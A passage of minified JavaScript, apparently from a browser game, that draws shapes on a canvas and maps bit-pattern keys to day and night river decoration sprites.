      n.bezierCurveTo(e * 366.0000305175781, e * 69.94886779785156, e * 366.0000305175781, e * 83.94886779785156, e * 363.0000305175781, e * 101.94886779785156);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      ze(n, e * 46.000030517578125, e * 137.5852279663086, e * 9.219544457292887);
      ye(n, t[4], t[5], e * 1);
      ze(n, e * 308.0000305175781, e * 141.5852279663086, e * 8.54400374531753);
      ye(n, t[4], t[5], e * 1);
      ze(n, e * 92.00003051757812, e * 149.58523559570312, e * 14.866068747318506);
      ye(n, t[4], t[5], e * 1);
      ze(n, e * 262.0000305175781, e * 148.8579559326172, e * 15.620499351813308);
      ye(n, t[4], t[5], e * 1);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 184.00003051757812, e * 68.85795593261719);
      n.bezierCurveTo(e * 203.00003051757812, e * 108.85795593261719, e * 203.00003051757812, e * 108.85795593261719, e * 222.00003051757812, e * 148.8579559326172);
      n.bezierCurveTo(e * 202.50003051757812, e * 177.8579559326172, e * 202.50003051757812, e * 177.8579559326172, e * 183.00003051757812, e * 206.8579559326172);
      n.bezierCurveTo(e * 162.00003051757812, e * 178.8579559326172, e * 162.00003051757812, e * 178.8579559326172, e * 141.00003051757812, e * 150.8579559326172);
      n.closePath();
      ye(n, t[4], t[5], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 183.00003051757812, e * 104.94886779785156);
      n.bezierCurveTo(e * 192.50003051757812, e * 125.44886779785156, e * 192.50003051757812, e * 125.44886779785156, e * 202.00003051757812, e * 145.94886779785156);
      n.bezierCurveTo(e * 192.00003051757812, e * 163.94886779785156, e * 192.00003051757812, e * 163.94886779785156, e * 182.00003051757812, e * 181.94886779785156);
      n.bezierCurveTo(e * 172.50003051757812, e * 164.44886779785156, e * 172.50003051757812, e * 164.44886779785156, e * 163.00003051757812, e * 146.94886779785156);
      n.closePath();
      ye(n, t[6]);
      return r;
    }
    function Rn() {
      var e = new Date().getTime();
      function i(e) {
        for (var i = 0, t = 0, r = 0; t < e.length; t++) {
          var n = e.charAt(t);
          if (n !== "_" && t !== 5) {
            if (n === "1") {
              i += Math.pow(2, r);
            }
            r++;
          }
        }
        return i;
      }
      render_cosmetics();
      sprite[Ie.RIVER_WAVE] = [IMAGES.RIVER_WAVED, IMAGES.RIVER_WAVEN];
      sprite[Ie.RIVER_DECO] = [];
      sprite[Ie.RIVER_DECO][Ie.DAY] = [];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_010_000")] = [IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_010_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("000_010_000")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_011_000")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("000_010_000")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_011_010")] = [IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_011_011")] = [IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_110_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_110_010")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO27];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_110_110")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO8, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO27];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_111_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_111_111")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO13];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_010_000")] = [IMAGES.DAY_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_010_010")] = [IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_011_000")] = [IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_011_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_011_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_111_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_111_000")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_111_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_111_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_111_110")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("010_111_111")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_111_110")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("000_111_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_011_000")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_011_010")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_011_011")] = [IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO15];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_000")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("011_011_010")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_010")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_010")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_110")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_010")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("011_111_111")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_110_000")] = [IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_110_010")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_110_110")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_000")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_110")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_111")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("110_111_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_110")] = [IMAGES.DAY_RIVER_COMPO28, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_011")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_110")];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_000")] = [IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO14];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_111")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_010")] = sprite[Ie.RIVER_DECO][Ie.DAY][i("111_111_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT] = [];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_010_000")] = [IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_010_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_010_000")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_011_000")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_010_000")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_011_010")] = [IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_011_011")] = [IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_110_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_110_010")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO27];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_110_110")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO8, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO27];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_111_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_111_111")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO13];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_010_000")] = [IMAGES.NIGHT_RIVER_COMPO20];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_010_010")] = [IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_011_000")] = [IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")] = [IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_011_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_011_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_111_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_111_000")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_111_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_111_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_111_110")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_111_111")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_111_110")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("000_111_010")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("010_110_110")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_011_000")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_011_010")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_011_011")] = [IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO15];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_000")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_011_010")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_010")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_011")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_010")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_110")] = sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_010")];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("011_111_111")] = [IMAGES.NIGHT_RIVER_COMPO1, IMAGES.NIGHT_RIVER_COMPO2, IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO13, IMAGES.NIGHT_RIVER_COMPO15, IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO28];
      sprite[Ie.RIVER_DECO][Ie.NIGHT][i("110_110_000")] = [IMAGES.NIGHT_RIVER_COMPO10, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO12, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO28];
